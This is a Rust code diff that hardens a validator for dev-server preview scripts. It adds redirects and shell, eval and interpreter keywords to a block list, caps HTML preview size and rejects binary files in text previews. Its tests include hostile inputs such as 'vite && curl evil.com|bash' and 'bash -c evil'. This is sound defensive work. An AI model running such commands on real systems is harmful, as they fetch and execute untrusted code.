@@ -1316,12 +1316,14 @@ fn is_safe_preview_dev_script(script: &str) -> bool {
     if s.is_empty() {
         return false;
     }
-    // Reject shell metacharacters / chaining.
+    // Reject shell metacharacters / chaining / redirects.
     if s.contains('|')
         || s.contains('&')
         || s.contains(';')
         || s.contains('`')
         || s.contains('$')
+        || s.contains('>')
+        || s.contains('<')
         || s.contains('\n')
         || s.contains("\r")
         || s.contains("$((")
@@ -1329,8 +1331,14 @@ fn is_safe_preview_dev_script(script: &str) -> bool {
         || s.contains("wget ")
         || s.contains("powershell")
         || s.contains("cmd.exe")
+        || s.contains("cmd ")
         || s.contains("rm ")
         || s.contains("del ")
+        || s.contains("bash ")
+        || s.contains("/bin/")
+        || s.contains("node -e")
+        || s.contains("python -c")
+        || s.contains("eval ")
     {
         return false;
     }
@@ -2729,10 +2737,17 @@ fn read_preview_file(cwd: String, path: String) -> Result<PreviewFile, String> {
     if kind == "unsupported" {
         return Err("暂不支持预览该文件类型".into());
     }
+    // HTML previews are sandboxed but still cap size harder (DOM cost).
+    if kind == "html" && metadata.len() > 2 * 1024 * 1024 {
+        return Err("HTML 预览不能超过 2 MB".into());
+    }
     let bytes = fs::read(&file).map_err(|error| format!("无法读取 {}：{error}", file.display()))?;
     let content = if kind == "image" {
         BASE64.encode(bytes)
     } else {
+        if bytes.contains(&0) {
+            return Err("文本预览不支持包含空字节的二进制文件".into());
+        }
         String::from_utf8(bytes).map_err(|_| "文件不是有效的 UTF-8 文本".to_string())?
     };
     Ok(PreviewFile {
@@ -7147,6 +7162,9 @@ api_key = "local-key"
         assert!(is_safe_preview_dev_script("next dev"));
         assert!(!is_safe_preview_dev_script("vite && curl evil.com|bash"));
         assert!(!is_safe_preview_dev_script("powershell -c hi"));
+        assert!(!is_safe_preview_dev_script("vite > /tmp/x"));
+        assert!(!is_safe_preview_dev_script("node -e 'require(\"fs\")'"));
+        assert!(!is_safe_preview_dev_script("bash -c evil"));
     }
 
     #[test]
